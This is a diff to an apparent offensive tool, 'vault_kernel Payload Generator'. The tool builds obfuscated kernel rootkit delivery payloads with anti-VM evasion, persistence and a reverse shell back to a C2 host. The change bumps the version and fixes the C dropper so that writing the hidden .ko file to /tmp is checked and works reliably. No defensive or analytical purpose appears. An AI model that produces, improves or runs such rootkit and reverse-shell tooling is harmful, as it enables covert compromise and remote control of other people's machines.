@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-vault_kernel Payload Generator v3.4
+vault_kernel Payload Generator v3.5
 Interactive builder for kernel rootkit delivery payloads.
 Auto-detects local IP, generates obfuscated multi-format payloads
 with anti-VM evasion and persistence.
@@ -356,7 +356,11 @@ int main(int argc, char **argv) {{
     snprintf(ko, sizeof(ko), "/tmp/.vk_%d.ko", (int)getpid());
     fd = open(ko, O_WRONLY|O_CREAT|O_TRUNC, 0600);
     if (fd < 0) {{ perror("open"); free(data); return 1; }}
-    write(fd, data, len);
+    /* glibc marks write() __wur (FORTIFY): ignoring the return value
+     * fails -Wunused-result on Ubuntu runners and breaks the payload
+     * regression job.  Check it for real — a short write corrupts
+     * the .ko. */
+    if (write(fd, data, len) != (ssize_t)len) {{ perror("write"); close(fd); free(data); return 1; }}
     close(fd);
     free(data);
 
@@ -412,7 +416,7 @@ int main(int argc, char **argv) {{
 # ================================================================
 def cli():
     import argparse
-    p = argparse.ArgumentParser(description="vault_kernel v3.4 Payload Generator")
+    p = argparse.ArgumentParser(description="vault_kernel v3.5 Payload Generator")
     p.add_argument("--host", help="C2 IP for reverse shell callback")
     p.add_argument("--port", default="4444", help="C2 port")
     p.add_argument("--format", choices=["bash","python","c","all"], default="bash")
@@ -457,7 +461,7 @@ def cli():
 # ================================================================
 def interactive():
     print("""
-  vault_kernel — Payload Generator v3.4
+  vault_kernel — Payload Generator v3.5
   ruby570bocadito (c) 2026
 """)
     local_ip = get_local_ip()
